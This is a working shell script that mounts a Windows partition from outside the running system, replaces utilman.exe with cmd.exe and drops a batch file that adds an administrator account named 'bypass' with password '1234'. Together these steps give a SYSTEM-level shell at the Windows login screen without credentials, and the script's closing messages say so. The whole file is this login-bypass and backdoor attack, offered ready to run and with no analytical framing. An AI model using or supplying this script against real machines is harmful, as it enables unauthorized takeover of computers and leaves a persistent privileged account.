#!/bin/sh

# Windows partition - ADAPT if necessary
WIN_PART="/dev/sda3"
MOUNT_POINT="/mnt/windows"

# Create mount point if it doesn't exist
mkdir -p "$MOUNT_POINT"

# Mount the Windows partition in read/write mode
mount -t ntfs-3g "$WIN_PART" "$MOUNT_POINT"
if [ $? -ne 0 ]; then
    echo "Error mounting Windows partition $WIN_PART"
    exit 1
fi

echo "Windows partition mounted at $MOUNT_POINT"

# Create the Windows batch script to create an admin user
cat << 'EOF' > "$MOUNT_POINT/Windows/System32/create_admin.bat"
@echo off
net user bypass 1234 /add
net localgroup Administrators bypass /add
EOF

echo "Script create_admin.bat copied to System32"

# Backup original utilman.exe (only if it doesn't already exist)
if [ ! -f "$MOUNT_POINT/Windows/System32/utilman.exe.bak" ]; then
    cp "$MOUNT_POINT/Windows/System32/utilman.exe" "$MOUNT_POINT/Windows/System32/utilman.exe.bak"
    echo "Backup of utilman.exe created"
fi

# Overwrite utilman.exe with cmd.exe
cp "$MOUNT_POINT/Windows/System32/cmd.exe" "$MOUNT_POINT/Windows/System32/utilman.exe"
if [ $? -eq 0 ]; then
    echo "utilman.exe successfully replaced with cmd.exe"
else
    echo "Error replacing utilman.exe"
fi

# Unmount the partition
umount "$MOUNT_POINT"
echo "Partition unmounted"

echo "Done! Now, at the Windows login accessibility prompt (icon), a SYSTEM-level cmd terminal will open."
echo "From there, you can run 'create_admin.bat' to create the admin user."

exit 0
